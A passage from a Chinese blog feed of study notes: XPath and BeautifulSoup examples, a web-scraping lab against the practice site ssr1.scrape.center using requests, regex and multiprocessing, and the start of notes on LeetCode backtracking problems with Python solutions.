class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#先选取li节点，然后利用/选取其直接子节点a，在选取节点a 的文本</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">></span><span class="token operator">/</span>bookstore<span class="token operator">/</span>book<span class="token punctuation">[</span>price<span class="token operator">></span><span class="token number">35</span><span class="token punctuation">]</span><span class="token operator">/</span>title <span class="token comment">#选取价格高于35的title节点</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">></span><span class="token operator">//</span>li<span class="token punctuation">[</span>contains<span class="token punctuation">(</span>@<span class="token keyword">class</span><span class="token punctuation">,</span><span class="token string">"li"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">/</span>a<span class="token operator">/</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#给第一个参数传入属性名称，第二个参数传入属性值</span><span class="token operator">></span>contains方法经常用于在某个节点的某个属性有多个值的时候用到<span class="token operator">**</span>运用lxml库的关键就是熟练掌握xpath选择语法<span class="token operator">**</span><span class="token comment">## beautifulsoup</span>https<span class="token punctuation">:</span><span class="token operator">//</span>beautifulsoup<span class="token punctuation">.</span>cn<span class="token operator">/</span>```python<span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token comment">#这是beautifulSoup的基本使用</span>url<span class="token operator">=</span><span class="token string">"http://quotes.toscrape.com/"</span>html<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>textsoup<span class="token operator">=</span>BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span><span class="token string">'lxml'</span><span class="token punctuation">)</span><span class="token comment">#对html源码初始化一个bs对象</span><span class="token keyword">print</span><span class="token punctuation">(</span>soup<span class="token punctuation">.</span>prettify<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#以标准缩进显示</span><span class="token keyword">print</span><span class="token punctuation">(</span>soup<span class="token punctuation">.</span>title<span class="token punctuation">)</span> <span class="token comment">#打印title节点的选择结果</span><span class="token keyword">print</span><span class="token punctuation">(</span>soup<span class="token punctuation">.</span>title<span class="token punctuation">.</span>string<span class="token punctuation">)</span><span class="token comment">#打印title节点的文本内容</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>soup<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#这是bs4.element.Tag 类型</span><span class="token keyword">print</span><span class="token punctuation">(</span>soup<span class="token punctuation">.</span>p<span class="token punctuation">)</span><span class="token comment">#结果是第一个p节点的内容</span><span class="token keyword">print</span><span class="token punctuation">(</span>soup<span class="token punctuation">.</span>head<span class="token punctuation">)</span><span class="token comment">#结果是head节点的所有内容</span><span class="token comment">#获取节点的信息</span><span class="token keyword">print</span><span class="token punctuation">(</span>soup<span class="token punctuation">.</span>p<span class="token punctuation">.</span>attrs<span class="token punctuation">)</span> <span class="token comment">#调用attrs获取p的所有属性</span><span class="token keyword">print</span><span class="token punctuation">(</span>soup<span class="token punctuation">.</span>p<span class="token punctuation">.</span>string<span class="token punctuation">)</span><span class="token comment">#获取p节点的文本</span><span class="token keyword">print</span><span class="token punctuation">(</span>soup<span class="token punctuation">.</span>p<span class="token punctuation">.</span>contents<span class="token punctuation">)</span><span class="token comment">#获取p的直接子节点</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h1 id="labs"><a class="markdownIt-Anchor" href="#labs"></a> <strong>labs</strong></h1><h2 id="lab-1"><a class="markdownIt-Anchor" href="#lab-1"></a> lab-1</h2><blockquote><p>url:<a href="https://ssr1.scrape.center/">https://ssr1.scrape.center/</a></p><p>tasks:spider the films names and details;save into json</p><p>goals: to familiar with re,requests,multiprocess</p></blockquote><p><img src="https://s2.loli.net/2024/03/13/7aTBLdEbjHQ1GSy.png" alt="" / loading="lazy"></p><ul><li>Step0:  从列表页入手，观察列表页的结构和翻页规则，102条数据，11页,<strong>page格式:url/page/{pagenumber} ;detail格式:url/detail/{id}</strong></li><li>Step1：浏览器查看源码:发现电影标题都在&lt;h2&gt;标签中</li><li>Step2:  发现规律：完成列表页的爬取</li></ul><blockquote><p>思路</p><ul><li>遍历所有页码,构造10页的索引页URL</li><li>从每个索引页，分析提取每个电脑的详情页URL</li></ul></blockquote><p><strong>实现</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> logging <span class="token comment">#输出信息，错误日志，便于debug的一个库</span><span class="token keyword">import</span> re<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urljoinlogging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">,</span><span class="token builtin">format</span><span class="token operator">=</span><span class="token string">'%(asctime)s-%(levelname)s:%(message)s'</span><span class="token punctuation">)</span><span class="token comment">#定义日志输出级别以及格式</span>BASE_URL<span class="token operator">=</span><span class="token string">"https://ssr1.scrape.center"</span> <span class="token comment">#以此为基URL进行拓展目标url</span>TOTAL_PAGE<span class="token operator">=</span><span class="token number">10</span><span class="token comment">#定义一个爬取网页源码的函数</span><span class="token keyword">def</span> <span class="token function">scrape_page</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"Scraping%s..."</span><span class="token punctuation">,</span>url<span class="token punctuation">)</span>    <span class="token comment">#错误处理逻辑:1.首先判断状态码是否为200，如果不是输出错误日志信息 2.此外，如果request请求出现异常,输出错误日志</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> response<span class="token punctuation">.</span>text        logging<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">'get invalid status code %s while scraping %s'</span><span class="token punctuation">,</span>response<span class="token punctuation">.</span>status_code<span class="token punctuation">,</span>url<span class="token punctuation">)</span>    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>RequestException<span class="token punctuation">:</span>        logging<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">'error occurred while scraping %s'</span><span class="token punctuation">,</span>url<span class="token punctuation">,</span>exc_info<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token comment">#exc_info打印Traceback的错误堆栈信息</span><span class="token comment">#定义一个解析列表页的函数</span><span class="token keyword">def</span> <span class="token function">parse_index</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">:</span>    pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;a.*?href="(.*?)".*?class="name">'</span><span class="token punctuation">)</span><span class="token comment">#提取href属性的正则表达式</span>    items<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> items<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        detail_url<span class="token operator">=</span>urljoin<span class="token punctuation">(</span>BASE_URL<span class="token punctuation">,</span>item<span class="token punctuation">)</span>        logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'get detail url %s'</span><span class="token punctuation">,</span>detail_url<span class="token punctuation">)</span>        <span class="token keyword">yield</span> detail_url        <span class="token comment">#调用yield返回完整url</span><span class="token comment">#定义一个列表页的爬取方式</span><span class="token keyword">def</span> <span class="token function">scrape_index</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">:</span>    index_url<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>BASE_URL<span class="token punctuation">&#125;</span></span><span class="token string">/page/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>page<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>    <span class="token keyword">return</span> scrape_page<span class="token punctuation">(</span>index_url<span class="token punctuation">)</span><span class="token comment">#定义一个详情页的爬取方式</span><span class="token keyword">def</span> <span class="token function">scrape_detail</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> scrape_page<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token comment">#到此步已经获取了所有详情网页的url，现在就该爬取url内容</span><span class="token keyword">def</span> <span class="token function">parse_detail</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#匹配图片</span>    cover_pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'class="item.*?&lt;img.*?src="(.*?)".*?class="cover">'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>    <span class="token comment">#匹配名称</span>    name_pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;h2.*?>(.*?)&lt;/h2>'</span><span class="token punctuation">)</span>    <span class="token comment">#匹配类型</span>    categories_pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;button.*?category&lt;span>(.*?)&lt;/span>'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>    <span class="token comment">#匹配上映时间</span>    published_at_pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'(\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;\s?上映)'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>    <span class="token comment">#匹配剧情简介</span>    drama_pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;div.*?drama.*?>.*?&lt;p.*?>(.*?)&lt;/p>'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>    <span class="token comment">#匹配评分</span>    score_pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'&lt;p.*?score.*?>(.*?)&lt;/p>'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>    cover<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>cover_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>cover_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">None</span>    name<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>name_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>name_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">None</span>    categories<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>categories_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span><span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>categories_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    published_at<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>published_at_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>published_at_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">None</span>    drama<span class="token operator">=</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>drama_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>drama_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">None</span>    score<span class="token operator">=</span><span class="token builtin">float</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>score_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>score_pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">None</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        <span class="token string">'cover'</span><span class="token punctuation">:</span>cover<span class="token punctuation">,</span>        <span class="token string">'name'</span><span class="token punctuation">:</span>name<span class="token punctuation">,</span>        <span class="token string">'categories'</span><span class="token punctuation">:</span>categories<span class="token punctuation">,</span>        <span class="token string">'published_at'</span><span class="token punctuation">:</span>published_at<span class="token punctuation">,</span>        <span class="token string">'drama'</span><span class="token punctuation">:</span>drama<span class="token punctuation">,</span>        <span class="token string">'score'</span><span class="token punctuation">:</span>score    <span class="token punctuation">&#125;</span><span class="token comment">#定义</span><span class="token comment">#main</span><span class="token comment">#此步已经提取了每部电影的基本信息</span><span class="token comment">#最后一步就是保存数据</span><span class="token keyword">import</span> json<span class="token keyword">from</span> os <span class="token keyword">import</span> makedirs<span class="token keyword">from</span> os<span class="token punctuation">.</span>path <span class="token keyword">import</span> existsRESULT_DIR<span class="token operator">=</span><span class="token string">'/results'</span>exists<span class="token punctuation">(</span>RESULT_DIR<span class="token punctuation">)</span> <span class="token keyword">or</span> makedirs<span class="token punctuation">(</span>RESULT_DIR<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">save_data</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    name<span class="token operator">=</span>data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>    data_path<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>RESULT_DIR<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">.json'</span></span>    json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token builtin">open</span><span class="token punctuation">(</span>data_path<span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>indent<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment">#indent=2代表json数据格式缩进2格，更美观，ensure_ascii:可以显示中文</span><span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>TOTAL_PAGE<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    index_html<span class="token operator">=</span>scrape_index<span class="token punctuation">(</span>page<span class="token punctuation">)</span>    detail_urls<span class="token operator">=</span>parse_index<span class="token punctuation">(</span>index_html<span class="token punctuation">)</span><span class="token comment">#获取生成器对象detail_url</span>    <span class="token keyword">for</span> detai_url <span class="token keyword">in</span> detail_urls<span class="token punctuation">:</span>        detai_url_html<span class="token operator">=</span>scrape_detail<span class="token punctuation">(</span>detai_url<span class="token punctuation">)</span>        data<span class="token operator">=</span>parse_detail<span class="token punctuation">(</span>detai_url_html<span class="token punctuation">)</span>        logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'get detail data%s'</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>        logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'saveing data to json file'</span><span class="token punctuation">)</span>        save_data<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'data saved successfully'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>多线程加速</li></ul><p>改写main函数即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> multiporcessing<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">:</span>    index_html<span class="token operator">=</span>scrape_index<span class="token punctuation">(</span>page<span class="token punctuation">)</span>    detail_urls<span class="token operator">=</span>parse_index<span class="token punctuation">(</span>index_html<span class="token punctuation">)</span><span class="token comment">#获取生成器对象detail_url</span>    <span class="token keyword">for</span> detai_url <span class="token keyword">in</span> detail_urls<span class="token punctuation">:</span>        detai_url_html<span class="token operator">=</span>scrape_detail<span class="token punctuation">(</span>detai_url<span class="token punctuation">)</span>        data<span class="token operator">=</span>parse_detail<span class="token punctuation">(</span>detai_url_html<span class="token punctuation">)</span>        logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'get detail data%s'</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>        logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'saveing data to json file'</span><span class="token punctuation">)</span>        save_data<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'data saved successfully'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    pool<span class="token operator">=</span>multiprocessing<span class="token punctuation">.</span>Pool<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#声明一个进程池</span>    pages<span class="token operator">=</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>TOTAL_PAGE<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>    pool<span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span>main<span class="token punctuation">,</span>pages<span class="token punctuation">)</span><span class="token comment">#分别把这10个页码传给这10个函数，进程池根据当前运行环境决定运行多少个进程</span>    pool<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    pool<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr class="footnotes-sep" /><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p>a-z0-9_- <a href="#fnref1" class="footnote-backref">↩︎</a></p></li><li id="fn2" class="footnote-item"><p>a-z0-9_- <a href="#fnref2" class="footnote-backref">↩︎</a></p></li><li id="fn3" class="footnote-item"><p>\u2E80-\u9FFF <a href="#fnref3" class="footnote-backref">↩︎</a></p></li><li id="fn4" class="footnote-item"><p>\s\S  <a href="#fnref4" class="footnote-backref">↩︎</a></p></li><li id="fn5" class="footnote-item"><p>0-9 <a href="#fnref5" class="footnote-backref">↩︎</a></p></li><li id="fn6" class="footnote-item"><p>0-9 <a href="#fnref6" class="footnote-backref">↩︎</a></p></li><li id="fn7" class="footnote-item"><p>\s\S  <a href="#fnref7" class="footnote-backref">↩︎</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法学习</title>
      <link href="/2024/03/01/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/01/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>用于记录刷leetcode学习各种算法的各种总结以及感想记录</p><p><a href="https://www.programmercarl.com/">比较好的leetcode刷题计划，刷完代码水平会有一个很明显的提升</a></p><ul><li><p>回溯算法</p></li><li><p>动态规划</p></li><li><p>贪心算法</p></li><li><p>二叉树</p></li><li><p>图论</p></li></ul><h1 id="回溯算法"><a class="markdownIt-Anchor" href="#回溯算法"></a> 回溯算法</h1><p>回溯法也可以叫做回溯搜索法，它是一种搜索的方式。</p><p>回溯是递归的副产品，只要有递归就会有回溯</p><p><strong>回溯的本质是穷举，穷举所有可能，然后选出我们想要的答案</strong>，如果想让回溯法高效一些，可以加一些剪枝的操作，但也改不了回溯法就是穷举的本质。</p><p>那么既然回溯法并不高效为什么还要用它呢？</p><p>一些问题能暴力搜出来就不错了，撑死了再剪枝一下，还没有更高效的解法。</p><p>回溯法，一般可以解决如下几种问题：</p><ul><li>组合问题：N个数里面按一定规则找出k个数的集合</li><li>切割问题：一个字符串按一定规则有几种切割方式</li><li>子集问题：一个N个数的集合里有多少符合条件的子集</li><li>排列问题：N个数按一定规则全排列，有几种排列方式</li><li>棋盘问题：N皇后，解数独等等</li></ul><p><strong>回溯法解决的问题都可以抽象为树形结构</strong></p><p>溯法解决的都是在集合中递归查找子集，<strong>集合的大小就构成了树的宽度，递归的深度，都构成的树的深度</strong>。</p><p>递归就要有终止条件，所以必然是一棵高度有限的树（N叉树）。</p><p><strong>一句话总结这道题的模板就是，for循环横向遍历，递归纵向遍历</strong></p><h2 id="组合问题"><a class="markdownIt-Anchor" href="#组合问题"></a> 组合问题</h2><h3 id="77-组合"><a class="markdownIt-Anchor" href="#77-组合"></a> <a href="https://leetcode.cn/problems/combinations/">77. 组合</a></h3><p>给定两个整数 <code>n</code> 和 <code>k</code>，返回范围 <code>[1, n]</code> 中所有可能的 <code>k</code> 个数的组合。</p><p>你可以按 <strong>任何顺序</strong> 返回答案。</p><h4 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h4><p>直接的解法当然是使用for循环</p><p>但是如果<strong>n为100，k为50呢，那就50层for循环</strong></p><p><strong>现虽然想暴力搜索，但是用for循环嵌套连暴力都写不出来</strong></p><p>所以回溯搜索就成为我们的选择，虽然也是暴力，但是至少可以写出来</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">combine</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> k<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#存放结果集</span>        self<span class="token punctuation">.</span>backtracking<span class="token punctuation">(</span>n<span class="token punctuation">,</span>k<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">backtracking</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>k<span class="token punctuation">,</span>startIndex<span class="token punctuation">,</span>path<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">==</span> k<span class="token punctuation">:</span>             result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>path<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>startIndex<span class="token punctuation">,</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment">#剪枝优化 终点应该为n-(k-len(path))+1+1</span>            path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token comment">#处理节点</span>            self<span class="token punctuation">.</span>backtracking<span class="token punctuation">(</span>n<span class="token punctuation">,</span>k<span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>path<span class="token punctuation">,</span>result<span class="token punctuation">)</span>            path<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#回溯，撤销处理的节点</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="剪枝优化"><a class="markdownIt-Anchor" href="#剪枝优化"></a> 剪枝优化</h4><p>回溯法虽然是暴力搜索，但也有时候可以有点剪枝优化一下的</p><p><strong>如果for循环选择的起始位置之后的元素个数 已经不足 我们需要的元素个数了，那么就没有必要搜索了</strong></p><p>优化过程如下：</p><ol><li>已经选择的元素个数：path.size();</li><li>所需需要的元素个数为: k - path.size();</li><li>列表中剩余元素（n-i） &gt;= 所需需要的元素个数（k - path.size()）</li><li>在集合n中至多要从该起始位置 : i &lt;= n - (k - path.size()) + 1，开始遍历</li></ol><p>因此只需要在for循环的终止节点修改如上即可实现</p><h3 id="216-组合总和-iii"><a class="markdownIt-Anchor" href="#216-组合总和-iii"></a> <a href="https://leetcode.cn/problems/combination-sum-iii/">216. 组合总和 III</a></h3><p>找出所有相加之和为 <code>n</code> 的 <code>k</code> 个数的组合，且满足下列条件：</p><ul><li>只使用数字1到9</li><li>每个数字 <strong>最多使用一次</strong></li></ul><h4 id="思路-2"><a class="markdownIt-Anchor" href="#思路-2"></a> 思路</h4><p>思路跟上题差不多，也可抽象为n叉树，然后dfs</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">combinationSum3</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> k<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>backtracking<span class="token punctuation">(</span>k<span class="token punctuation">,</span>n<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span>        <span class="token 